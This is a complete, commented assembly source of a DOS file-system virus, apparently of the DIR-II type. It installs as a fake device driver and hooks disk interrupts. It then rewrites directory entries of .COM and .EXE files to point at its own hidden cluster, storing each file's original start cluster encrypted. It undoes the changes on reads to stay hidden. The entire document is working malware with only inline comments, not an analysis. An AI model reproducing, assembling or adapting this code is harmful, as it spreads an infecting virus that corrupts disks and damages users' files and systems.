seg_a   segment byte public
    assume  cs:seg_a, ds:seg_a

    org 100h

start:  mov sp,600h         ;virus stack        ;0100  BC 0600
    inc d_04EB          ;virus generation   ;0103  FF 06 04EB
    xor cx,cx                       ;0107  31 C9
    mov ds,cx                       ;0109  8E D9
    lds ax,dword ptr ds:[0C1h]  ;JMP into DOS + 1   ;010B  C5 06 00C1
    add ax,21h          ;int 21h entry + 7  ;010F  05 0021
    push    ds                      ;0112  1E
    push    ax                      ;0113  50
    mov ah,30h          ;Get DOS version number ;0114  B4 30
    call    s_023D          ;int 21h        ;0116  E8 0124
    cmp al,4            ;4.0            ;0119  3C 04
    sbb si,si           ;if dos <4.0 si=-1  ;011B  19 F6
    mov byte ptr ds:[d_0465],0FFh           ;011D  C6 06 0465 FF
    mov bx,60h          ;paragraphs of memory   ;0122  BB 0060
    mov ah,4Ah          ;Set Block      ;0125  B4 4A
    call    s_023D          ;int 21h        ;0127  E8 0113
    mov ah,52h          ;get list of lists  ;012A  B4 52
    call    s_023D          ;int 21h        ;012C  E8 010E
    push    word ptr es:[bx-2]  ;first mem.ctrl blk seg ;012F  26: FF 77 FE
    lds bx,dword ptr es:[bx]    ;first disk info blk adr;0133  26: C5 1F
l_0136: mov ax,[bx+si+15h]      ;segm of device header  ;0136  8B 40 15
    cmp ax,70h          ;inside DOS ?       ;0139  3D 0070
    jne l_014E          ;-> non standard    ;013C  75 10
    xchg    ax,cx                       ;013E  91
    mov byte ptr [bx+si+18h],0FFh ;drive not accessed   ;013F  C6 40 18 FF
    mov di,[bx+si+13h]        ;device header offset ;0143  8B 78 13
    mov word ptr [bx+si+13h],4E9h ;new device header off;0146  C7 40 13 04E9
    mov [bx+si+15h],cs        ;new device header seg;014B  8C 48 15
l_014E: lds bx,dword ptr [bx+si+19h]  ;next Disk Info Block ;014E  C5 58 19
    cmp bx,0FFFFh         ;end of chain ?   ;0151  83 FB FF
    jne l_0136          ;-> no          ;0154  75 E0
    jcxz    l_01CD          ;-> on one found, EXIT  ;0156  E3 75
    pop ds          ;first memory ctrl block;0158  1F
    mov ax,ds                       ;0159  8C D8
    add ax,ds:[3]       ;block length       ;015B  03 06 0003
    inc ax          ;+ctrl block        ;015F  40
    mov dx,cs                       ;0160  8C CA
    dec dx          ;virus memory ctrl blk  ;0162  4A
    cmp ax,dx                       ;0163  39 D0
    jne l_016C          ;it,s no current block  ;0165  75 05
    add word ptr ds:[3],61h ;+ virus length     ;0167  83 06 0003 61
l_016C: mov ds,dx                       ;016C  8E DA
    mov word ptr ds:[1],8   ;owner := system    ;016E  C7 06 0001 0008
    mov ds,cx           ;oryginal DEV HDR seg   ;0174  8E D9
    les ax,dword ptr [di+6] ;oryginal service addr  ;0176  C4 45 06
    mov word ptr cs:[d_04B2],ax ;strategy  handler  ;0179  2E: A3 04B2
    mov word ptr cs:[d_04B7],es ;interrupt handler  ;017D  2E: 8C 06 04B7

;<----- find int 13h entry, first method - in system area
    ;   FF 1E xx xx yy yy ** CA 02
    ;
    cld                         ;0182  FC
    mov si,1                        ;0183 .BE 0001
l_0186: dec si                      ;0186  4E
    lodsw                           ;0187  AD
    cmp ax,1EFFh                    ;0188  3D 1EFF
    jne l_0186                      ;018B  75 F9
    mov ax,2CAh                     ;018D  B8 02CA
    cmp [si+4],ax                   ;0190  39 44 04
    je  l_019A                      ;0193  74 05
    cmp [si+5],ax                   ;0195  39 44 05
    jne l_0186                      ;0198  75 EC
l_019A: lodsw               ;value xx xx        ;019A  AD
    push    cs                      ;019B  0E
    pop es                      ;019C  07
    mov di,offset d_0494                ;019D .BF 0494
    stosw                           ;01A0  AB
    xchg    ax,si           ;readed value       ;01A1  96
    mov di,offset d_05F8                ;01A2 .BF 05F8
    cli             ;to avoid addr destruct.;01A5  FA
    movsw               ;offset         ;01A6  A5
    movsw               ;segment        ;01A7  A5

;<----- find int 13h entry, second method - inside BIOS
    mov dx,0C000h       ;ROM extensions area    ;01A8  BA C000
l_01AB: mov ds,dx                       ;01AB  8E DA
    xor si,si                       ;01AD  31 F6
    lodsw                           ;01AF  AD
    cmp ax,0AA55h       ;BIOS signature     ;01B0  3D AA55
    jne l_01D8          ;-> not BIOS begin  ;01B3  75 23

    ;<----- BIOS area found
    cbw             ;ah:=0          ;01B5  98
    lodsb               ;BIOS length        ;01B6  AC
    mov cl,9            ;* 512          ;01B7  B1 09
    shl ax,cl                       ;01B9  D3 E0
l_01BB: cmp word ptr [si],06C7h ;first part of code ;01BB  81 3C 06C7
    jne l_01D3                      ;01BF  75 12
    cmp word ptr [si+2],004Ch   ;second part of code    ;01C1  83 7C 02 4C
    jne l_01D3                      ;01C5  75 0C
                    ;<- entry founded
    push    dx          ;segment        ;01C7  52
    push    word ptr [si+4]     ;offset         ;01C8  FF 74 04
    jmp short l_01E1                    ;01CB  EB 14

    ;<----- no device header found
l_01CD: int 20h         ;Program Terminate  ;01CD  CD 20

d_01CF  db  'c:',0FFh,0     ;file name      ;01CF  63 3A FF 00

l_01D3: inc si          ;next in BIOS position  ;01D3  46
    cmp si,ax           ;end of BIOS ?      ;01D4  39 C6
    jb  l_01BB          ;-> not         ;01D6  72 E3
l_01D8: inc dx          ;next memory paragraph  ;01D8  42
    cmp dh,0F0h         ;begin of system BIOS ? ;01D9  80 FE F0
    jb  l_01AB          ;-> not yet     ;01DC  72 CD

                    ;<- end of memory pool
    sub sp,4            ;leave 1st method addr  ;01DE  83 EC 04

    ;<------
l_01E1: push    cs                      ;01E1  0E
    pop ds                      ;01E2  1F
    mov bx,ds:[2Ch]     ;Environment segment    ;01E3  8B 1E 002C
    mov es,bx                       ;01E7  8E C3
    mov ah,49h          ;Free Allocated memory  ;01E9  B4 49
    call    s_023D          ;int 21h        ;01EB  E8 004F
    xor ax,ax                       ;01EE  31 C0
    test    bx,bx           ;environment seg = 0 ?  ;01F0  85 DB
    jz  l_0200          ;-> yes         ;01F2  74 0C

    ;<----- find end of environment variables
    mov di,1                        ;01F4 .BF 0001
l_01F7: dec di                      ;01F7  4F
    scasw                           ;01F8  AF
    jnz l_01F7                      ;01F9  75 FC
    lea si,[di+2]       ;victim name        ;01FB  8D 75 02
    jmp short l_020C                    ;01FE  EB 0C

l_0200: mov es,ds:[16h]     ;command.com mem seg dn ;0200  8E 06 0016
    mov bx,es:[16h]     ;command.com mem seg dn ;0204  26: 8B 1E 0016
    dec bx          ;point to mem ctrl blk  ;0209  4B
    xor si,si                       ;020A  31 F6

l_020C: push    bx          ;environment segment    ;020C  53
    mov bx,offset d_04F4                ;020D  BB 04F4
    mov [bx+4],cs                   ;0210  8C 4F 04
    mov [bx+8],cs                   ;0213  8C 4F 08
    mov [bx+0Ch],cs                 ;0216  8C 4F 0C
    pop ds          ;file name segment  ;0219  1F
    push    cs                      ;021A  0E
    pop es                      ;021B  07
    mov di,offset d_0522    ;name address       ;021C .BF 0522
    push    di                      ;021F  57
    mov cx,28h          ;80 bytes       ;0220  B9 0028
    rep movsw                       ;0223  F3/ A5
    push    cs                      ;0225  0E
    pop ds                      ;0226  1F
    mov ah,3Dh          ;Open Handle        ;0227  B4 3D
    mov dx,offset d_01CF    ;'c:',0FFh,0        ;0229  BA 01CF
    call    s_023D          ;int 21h        ;022C  E8 000E
    pop dx          ;file name address  ;022F  5A
    mov ax,4B00h        ;Load & Run Overlay ;0230  B8 4B00
    call    s_023D          ;int 21h        ;0233  E8 0007
    mov ah,4Dh          ;Get Return Code of Chld;0236  B4 4D
    call    s_023D          ;int 21h        ;0238  E8 0002
    mov ah,4Ch          ;End Process        ;023B  B4 4C

;========================================================
;   Execute int 21h
;--------------------------------------------------------
s_023D  proc    near
    pushf                           ;023D  9C
    call    dword ptr cs:[05FCh]    ;last stack words   ;023E  2E: FF 1E 05FC
    retn                            ;0243  C3
s_023D  endp

;========================================================
;   Write using special int 13h entry
;--------------------------------------------------------
l_0244: mov ah,3                        ;0244  B4 03
    jmp dword ptr cs:[d_05F8]   ;into int 13h service   ;0246  2E: FF 2E 05F8

;========================================================
;   Device strategy routine
;--------------------------------------------------------
;   es:bx - request header
;-------
;+0 db  length of request header
;+1 db  unit code
;+2 db  command code    2 = build Bios Parameter Block
;               4 = Read
;               8 = Write
;               9 = Write with verify
;+3 dw  status
;+5 db  8 dup (?)   reserved
;-------
l_024B: push    ax                      ;024B  50
    push    cx                      ;024C  51
    push    dx                      ;024D  52
    push    ds                      ;024E  1E
    push    si                      ;024F  56
    push    di                      ;0250  57
    push    es                      ;0251  06
    pop ds                      ;0252  1F
    mov al,[bx+2]   ;command code           ;0253  8A 47 02
    cmp al,4                        ;0256  3C 04
    je  l_02BB      ;-> read            ;0258  74 61
    cmp al,8                        ;025A  3C 08
    je  l_02A3      ;-> write           ;025C  74 45
    cmp al,9                        ;025E  3C 09
    je  l_02A3      ;-> write           ;0260  74 41
    call    s_04B1      ;Exec oryg strat.+int. call ;0262  E8 024C
    cmp al,2                        ;0265  3C 02
    jne l_029C      ;-> EXIT            ;0267  75 33

;<===== 2 = Build Bios Parameter Block - decrease sectors on media count
    lds si,dword ptr [bx+12h]   ;Dword ptr to BPB   ;0269  C5 77 12
    mov di,offset d_0502                ;026C .BF 0502
    mov es:[bx+12h],di      ;New BPB address    ;026F  26: 89 7F 12
    mov es:[bx+14h],cs                  ;0273  26: 8C 4F 14
    push    es                      ;0277  06
    push    cs                      ;0278  0E
    pop es                      ;0279  07
    mov cx,10h                      ;027A  B9 0010
    rep movsw                       ;027D  F3/ A5
    pop es                      ;027F  07
    push    cs                      ;0280  0E
    pop ds                      ;0281  1F
    mov al,[di-1Eh]     ;cluster size       ;0282  8A 45 E2
    cmp al,2                        ;0285  3C 02
    adc al,0                        ;0287  14 00
    cbw                         ;0289  98
    cmp word ptr [di-18h],0 ;total sectors per media;028A  83 7D E8 00
    je  l_0295                      ;028E  74 05
    sub [di-18h],ax     ;- 1 cluster        ;0290  29 45 E8
    jmp short l_029C    ;-> EXIT            ;0293  EB 07

l_0295: sub [di-0Bh],ax     ;total sector > 64K low ;0295  29 45 F5
    sbb word ptr [di-9],0   ;           high;0298  83 5D F7 00

l_029C: pop di                      ;029C  5F
    pop si                      ;029D  5E
    pop ds                      ;029E  1F
    pop dx                      ;029F  5A
    pop cx                      ;02A0  59
    pop ax                      ;02A1  58
;=======
; interrupt routine
;-------
l_02A2: retf                            ;02A2  CB


;<===== 8 & 9 = WRITE
l_02A3: mov cx,0FF09h                   ;02A3  B9 FF09
    call    s_0460      ;Check media change     ;02A6  E8 01B7
    jz  l_02B0      ;-> not changed         ;02A9  74 05
    call    s_04B1      ;Exec oryg strat.+int. call ;02AB  E8 0203
    jmp short l_02C0                    ;02AE  EB 10

l_02B0: jmp l_03DB                      ;02B0  E9 0128

l_02B3: jmp l_03D5                      ;02B3  E9 011F

l_02B6: add sp,10h      ;<- comtamination error entry   ;02B6  83 C4 10
    jmp short l_029C    ;-> EXIT            ;02B9  EB E1

;<====== 4 = READ
l_02BB: call    s_0460      ;Check media change     ;02BB  E8 01A2
    jz  l_02B3      ;-> not changed         ;02BE  74 F3

l_02C0: mov byte ptr [bx+2],4  ;function := read        ;02C0  C6 47 02 04

    cld         ;save request header        ;02C4  FC
    lea si,[bx+0Eh] ;               ;02C5  8D 77 0E
    mov cx,8                        ;02C8  B9 0008
l_02CB: lodsw                           ;02CB  AD
    push    ax                      ;02CC  50
    loop    l_02CB                      ;02CD  E2 FC

    mov word ptr [bx+14h],1 ;starting sector nr ;02CF  C7 47 14 0001
    call    s_04AB          ;read 1 sector      ;02D4  E8 01D4
    jnz l_02B6          ;-> error       ;02D7  75 DD
    mov byte ptr [bx+2],2   ;function build BPB ;02D9  C6 47 02 02
    call    s_04B1      ;Exec oryg strat.+int. call ;02DD  E8 01D1
    lds si,dword ptr [bx+12h]   ;ptr to BPB     ;02E0  C5 77 12
    mov ax,[si+6]       ;max root dir entries   ;02E3  8B 44 06
    add ax,0Fh          ;adjust         ;02E6  05 000F
    mov cl,4            ;/16 (entries/sector)   ;02E9  B1 04
    shr ax,cl                       ;02EB  D3 E8
    mov di,[si+0Bh]     ;fat size       ;02ED  8B 7C 0B
    add di,di           ;2 fat copies       ;02F0  01 FF
    stc             ;+boot sector       ;02F2  F9
    adc di,ax           ;+directory size    ;02F3  11 C7
    push    di          ;first data sector  ;02F5  57
    cwd                         ;02F6  99
    mov ax,[si+8]       ;total nr of sectors    ;02F7  8B 44 08
    test    ax,ax                       ;02FA  85 C0
    jnz l_0304          ;-> not zero        ;02FC  75 06
    mov ax,[si+15h]     ;total sec nr >64K low  ;02FE  8B 44 15
    mov dx,[si+17h]     ;          high ;0301  8B 54 17
l_0304: xor cx,cx                       ;0304  31 C9
    sub ax,di                       ;0306  29 F8
    sbb dx,cx                       ;0308  19 CA
    mov cl,[si+2]       ;sectors per cluster    ;030A  8A 4C 02
    div cx                      ;030D  F7 F1
    cmp cl,2                        ;030F  80 F9 02
    sbb ax,0FFFFh                   ;0312  1D FFFF
    push    ax          ;dx:ax=last cluster nr  ;0315  50
    call    s_04C1          ;compute position in FAT;0316  E8 01A8
    mov byte ptr es:[bx+2],4    ;command read       ;0319  26: C6 47 02 04
    mov es:[bx+14h],ax      ;sector         ;031E  26: 89 47 14
    call    s_04AB          ;read 1 sector nr   ;0322  E8 0186
l_0325: lds si,dword ptr es:[bx+0Eh];buffer address     ;0325  26: C5 77 0E
    add si,dx           ;in sector position ;0329  01 D6
                ;<---- compute encription key
    sub dh,cl           ;sectors/cluster    ;032B  28 CE
    adc dx,ax           ;sector nr      ;032D  11 C2
    mov word ptr cs:[43Fh],dx   ;encription key     ;032F  2E: 89 16 043F
    cmp cl,1            ;1 sector/cluster   ;0334  80 F9 01
    je  l_0354          ;-> yes         ;0337  74 1B

                ;<---- one cluster virus
    mov ax,[si]         ;word from FAT      ;0339  8B 04
    and ax,di           ;mask to cut word   ;033B  21 F8
    cmp ax,0FFF7h                   ;033D  3D FFF7
    je  l_034C          ;-> bad cluster     ;0340  74 0A
    cmp ax,0FF7h                    ;0342  3D 0FF7
    je  l_034C          ;-> bad cluster     ;0345  74 05
    cmp ax,0FF70h                   ;0347  3D FF70
    jne l_0376          ;-> good disk here  ;034A  75 2A
l_034C: pop ax          ;decrease cluster nr    ;034C  58
    dec ax                      ;034D  48
    push    ax                      ;034E  50
    call    s_04C1      ;compute position in FAT    ;034F  E8 016F
    jmp short l_0325                    ;0352  EB D1

                ;<----- two cluster virus
l_0354: not di      ;mask               ;0354  F7 D7
    and [si],di     ;free cluster           ;0356  21 3C
    pop ax      ;last cluster nr        ;0358  58
    push    ax      ;make cluster chain     ;0359  50
    inc ax                      ;035A  40
    push    ax                      ;035B  50
    mov dx,0Fh                      ;035C  BA 000F
    test    dx,di                       ;035F  85 D7
    jz  l_0366      ;-> right adjusted      ;0361  74 03
                ;<- left adjust (mult. by 16)
    inc dx      ;dx=10h             ;0363  42
    mul dx                      ;0364  F7 E2
l_0366: or  [si],ax     ;last cluster point one cl.back ;0366  09 04
    pop ax                      ;0368  58
    call    s_04C1      ;compute position in FAT    ;0369  E8 0155
    mov si,es:[bx+0Eh]  ;buffer offset          ;036C  26: 8B 77 0E
    add si,dx       ;fat entry address      ;0370  01 D6
    mov ax,[si]     ;fat entry content      ;0372  8B 04
    and ax,di       ;cut                ;0374  21 F8

    ;<----- cluster in FAT ready
l_0376: mov dx,di       ;FAT mask           ;0376  8B D7
    dec dx      ;(F)FFEh            ;0378  4A
    and dx,di                       ;0379  21 FA
    not di      ;-> bits to clear       ;037B  F7 D7
    and [si],di     ;clear fat position     ;037D  21 3C
    or  [si],dx     ;one cluster file (lost cluster);037F  09 14
    cmp ax,dx       ;cluster nr = (F)FFE ?      ;0381  39 D0
    pop ax                      ;0383  58
    pop di                      ;0384  5F
    mov word ptr cs:[434h],ax   ;cluster nr to inf proc ;0385  2E: A3 0434
    jz  l_03CA      ;-> number to high      ;0389  74 3F
    mov dx,[si]                     ;038B  8B 14
    push    ds                      ;038D  1E
    push    si                      ;038E  56
    call    s_0482      ;Write back modifyed FAT    ;038F  E8 00F0
    pop si                      ;0392  5E
    pop ds                      ;0393  1F
    jnz l_03CA      ;-> error           ;0394  75 34
                ;<- no error
    call    s_04AB      ;read 1 sector          ;0396  E8 0112
    cmp [si],dx     ;modyfied ?         ;0399  39 14
    jne l_03CA      ;-> no, write protection    ;039B  75 2D
    dec ax      ;cluster nr-2 (first data clu=2);039D  48
    dec ax                      ;039E  48
    mul cx      ;cluster size           ;039F  F7 E1
    add ax,di       ;data cluster base      ;03A1  01 F8
    adc dx,0                        ;03A3  83 D2 00
    push    es                      ;03A6  06
    pop ds                      ;03A7  1F
    mov word ptr [bx+12h],2 ;sector count       ;03A8  C7 47 12 0002
    mov [bx+14h],ax     ;starting sector nr ;03AD  89 47 14
    test    dx,dx           ;sector nr < 64 K ? ;03B0  85 D2
    jz  l_03BF          ;-> yes         ;03B2  74 0B
                ;<- DOS 4.0 partition > 64KB
    mov word ptr [bx+14h],0FFFFh;starting sector nr ;03B4  C7 47 14 FFFF
    mov [bx+1Ah],ax     ;dword sector nr low    ;03B9  89 47 1A
    mov [bx+1Ch],dx     ;        high   ;03BC  89 57 1C
l_03BF: mov [bx+10h],cs     ;buffer segment     ;03BF  8C 4F 10
    mov word ptr [bx+0Eh],100h  ;buffer offset      ;03C2  C7 47 0E 0100
    call    s_0482      ;Write virus code       ;03C7  E8 00B8

                ;<- restore request header
l_03CA: std                         ;03CA  FD
    lea di,[bx+1Ch]                 ;03CB  8D 7F 1C
    mov cx,8                        ;03CE  B9 0008
l_03D1: pop ax                      ;03D1  58
    stosw                           ;03D2  AB
    loop    l_03D1                      ;03D3  E2 FC

;=======================================================
;   Infect directory routine
;-------------------------------------------------------
    ;<----- read entry (need to read directory first)
l_03D5: call    s_04B1      ;Exec oryg strat.+int. call ;03D5  E8 00D9
    mov cx,9        ;files to infect        ;03D8  B9 0009

    ;<----- write entry (sector allready in memory)
l_03DB: mov di,es:[bx+12h]  ;Sector count           ;03DB  26: 8B 7F 12
    lds si,dword ptr es:[bx+0Eh]  ;transfer address ;03DF  26: C5 77 0E
    shl di,cl       ;*512               ;03E3  D3 E7
    xor cl,cl                       ;03E5  30 C9
    add di,si       ;end of directory address   ;03E7  01 F7
    xor dl,dl       ;'infect' pointer       ;03E9  30 D2
    push    ds                      ;03EB  1E
    push    si                      ;03EC  56
    call    s_0403      ;INFECT DIRECTORY       ;03ED  E8 0013
    jcxz    l_03FA      ;-> no one infect       ;03F0  E3 08
    call    s_0482      ;Write back infected directory  ;03F2  E8 008D
    and byte ptr es:[bx+4],7Fh  ;clear error status ;03F5  26: 80 67 04 7F
l_03FA: pop si      ;begin of directory address ;03FA  5E
    pop ds                      ;03FB  1F
    inc dx      ;'cure' pointer         ;03FC  42
    call    s_0403      ;CURE DIRECTORY         ;03FD  E8 0003
    jmp l_029C      ;-> EXIT            ;0400  E9 FE99

;=======================================================
;              SUBROUTINE
;-------------------------------------------------------
;   si = directory position
;   di = end position
;   dl = 0-infect, 1-cure directory
;   cx = files to infect count
;-------
s_0403  proc    near
l_0403: mov ax,[si+8]                   ;0403  8B 44 08
    cmp ax,5845h        ;'XE'           ;0406  3D 5845
    jne l_0410                      ;0409  75 05
    cmp [si+0Ah],al     ;'E'            ;040B  38 44 0A
    je  l_041B          ;-> *.EXE       ;040E  74 0B
l_0410: cmp ax,4F43h        ;'OC'           ;0410  3D 4F43
    jne l_0453                      ;0413  75 3E
    cmp byte ptr [si+0Ah],4Dh   ; 'M'           ;0415  80 7C 0A 4D
    jne l_0453                      ;0419  75 38

    ;<----- *.EXE, *.COM
l_041B: test    word ptr [si+1Eh],0FFC0h  ;>4 194 303       ;041B  F7 44 1E FFC0
    jnz l_0453            ;-> not infectable    ;0420  75 31
    test    word ptr [si+1Dh],3FF8h   ;< 2 048      ;0422  F7 44 1D 3FF8
    jz  l_0453            ;-> not infectable    ;0427  74 2A
    test    byte ptr [si+0Bh],1Ch     ;atribute     ;0429  F6 44 0B 1C
    jnz l_0453            ;-> not only RO & Arc ;042D  75 24
    test    dl,dl                       ;042F  84 D2
    jnz l_0446          ;-> cure        ;0431  75 13
                    ;<- infect
    mov ax,163h         ;cluster 355        ;0433  B8 0163
d_0434  equ $-2
    cmp ax,[si+1Ah]     ;infected ?     ;0436  3B 44 1A
    je  l_0453          ;-> yes         ;0439  74 18
    xchg    ax,[si+1Ah]     ;new cluster        ;043B  87 44 1A
    xor ax,0FE17h       ;not constant !!    ;043E  35 FE17
d_043F  equ $-2
    mov [si+14h],ax     ;not used part of entry ;0441  89 44 14
    loop    l_0453                      ;0444  E2 0D

    ;<----- cure
l_0446: xor ax,ax                       ;0446  31 C0
    xchg    ax,[si+14h]     ;saved cluster      ;0448  87 44 14
    xor ax,word ptr cs:[d_043F] ;decrypt        ;044B  2E: 33 06 043F
    mov [si+1Ah],ax     ;first file cluster ;0450  89 44 1A

    ;<----- not executable directory position
l_0453: rol word ptr cs:[D_043F],1              ;0453  2E: D1 06 043F
    add si,20h          ;next dir position  ;0458  83 C6 20
    cmp di,si           ;end of directory ? ;045B  39 F7
    jne l_0403          ;-> no          ;045D  75 A4
    retn                            ;045F  C3
s_0403  endp


;=======================================================
;   Check media change
;-------------------------------------------------------
s_0460  proc    near
    mov ah,[bx+1]       ;unit code      ;0460  8A 67 01
    cmp ah,0                        ;0463  80 FC 00
d_0465  equ $-1         ;init to 0FFh
    mov byte ptr cs:[d_0465],ah             ;0466  2E: 88 26 0465
    jnz l_0481          ;-> 1st call to unit    ;046B  75 14
    push    word ptr [bx+0Eh]   ;save destructed byte   ;046D  FF 77 0E
    mov byte ptr [bx+2],1   ;command media check    ;0470  C6 47 02 01
    call    s_04B1      ;Exec oryg strat.+int. call ;0474  E8 003A
    cmp byte ptr [bx+0Eh],1 ;media not changed ?    ;0477  80 7F 0E 01
    pop word ptr [bx+0Eh]               ;047B  8F 47 0E
    mov [bx+2],al       ;oryginal command   ;047E  88 47 02
l_0481: retn                            ;0481  C3
s_0460  endp


;=======================================================
;   Write sector
;-------------------------------------------------------
s_0482  proc    near
    cmp byte ptr es:[bx+2],8    ;function WRITE ?   ;0482  26: 80 7F 02 08
    jae l_04B1          ;-> Execute function    ;0487  73 28
    mov byte ptr es:[bx+2],4    ;function READ      ;0489  26: C6 47 02 04
    mov si,70h          ;DOS segment        ;048E  BE 0070
    mov ds,si                       ;0491  8E DE
    mov si,00B4h                    ;0493 .BE 00B4
d_0494  equ $-2         ;founded value from system area
    push    word ptr [si]       ;save oryginal content  ;0496  FF 34
    push    word ptr [si+2]                 ;0498  FF 74 02
    mov word ptr [si],offset l_0244 ;all services:=write;049B  C7 04 0244
    mov [si+2],cs                   ;049F  8C 4C 02
    call    s_04B1      ;Exec oryg strat.+int. call ;04A2  E8 000C
    pop word ptr [si+2]     ;oryginal function  ;04A5  8F 44 02
    pop word ptr [si]                   ;04A8  8F 04
    retn                            ;04AA  C3
s_0482  endp


;=======================================================
s_04AB: mov word ptr es:[bx+12h],1  ;sector count       ;04AB  26: C7 47 12 0001

;=======================================================
;   Execute oryginal strategy+interrupt call
;-------------------------------------------------------
s_04B1  proc    near

l_04B1: db  9Ah,0DCh,05h,70h,00h                ;04B1  9A DC 05 70 00
    ;call   far ptr 0070:05DC
d_04b2  equ $-4         ;oryginal strategy routine

    db  9Ah,34h,06h,70h,00h             ;04B6  9A 34 06 70 00
    ;call   far ptr 0070:0634
d_04B7  equ $-4         ;oryginal interrupt routine

    test    byte ptr es:[bx+4],80h  ;check if error     ;04BB  26: F6 47 04 80
    retn                            ;04C0  C3
s_04B1  endp


;=======================================================
;   compute position in FAT
;-------------------------------------------------------
;   dx:ax=last cluster nr
s_04C1  proc    near
    cmp ax,0FF0h        ;4080           ;04C1  3D 0FF0
    jae l_04DC          ;-> 16 bit FAT      ;04C4  73 16
                    ;<- 12 bit FAT
    mov si,3                        ;04C6 .BE 0003
    xor word ptr cs:[43Dh+si],si;17h/14h encription key ;04C9  2E: 31 B4 043D
    mul si          ;cluster * 3 halfbytes  ;04CE  F7 E6
    shr ax,1            ;/2 to make halfbytes   ;04D0  D1 E8
    mov di,0FFFh        ;mask           ;04D2  BF 0FFF
    jnc l_04E4          ;-> lowest bit not set  ;04D5  73 0D
    mov di,0FFF0h       ;another mask       ;04D7  BF FFF0
    jmp short l_04E4                    ;04DA  EB 08

l_04DC: mov si,2            ;* 2 byte per FAT entry ;04DC  BE 0002
    mul si                      ;04DF  F7 E6
    mov di,0FFFFh       ;mask           ;04E1  BF FFFF
l_04E4: mov si,200h         ;bytes per sector   ;04E4  BE 0200
    div si                      ;04E7  F7 F6
    inc ax          ;+ reminder         ;04E9  40
    retn                            ;04EA  C3
s_04C1  endp

;------ DEVICE HEADER ------------------------------------------
d_04E9  equ $-2     ;dword ptr to next device header
d_04EB  dw  26h     ;virus generation       ;04EB  0026
    dw  0842h       ;device attributes      ;04ED  42 08
    dw  l_024B      ;strategy routine       ;04EF  4B 02
    dw  l_02A2      ;interrupt routine      ;04F1  A2 02
    db   7Fh        ;device name (8 bytes)      ;04F3  7F

    ;<------ parameter block
d_04F4  dw   0000h      ;Environment            ;04F4  00 00
    dw   0080h      ;command line           ;04F6  80 00
    dw   72D7h      ;:= virus segment       ;04F8  D7 72
    dw   005Ch      ;FCB-1              ;04FA  5C 00
    dw   72D7h      ;:= virus segment       ;04FC  D7 72
    dw   006Ch      ;FCB-2              ;04FE  6C 00

;<----- end of virus part resident on disk ---------------------------------
    dw  ?       ;:= virus segment       ;0500

d_0502  db  32 dup (?)  ;Bios Parameter Block

    ;<----- file name
d_0522  db  80 dup (?)  ;file with virus name

    db  134 dup (?)

d_05F8  dw  ?,?     ;entry into int 13h
d_05FC  dw  ?,?     ;entry into DOS int 21h
d_0600  label   word        ;<- stack top
seg_a   ends

    end start
    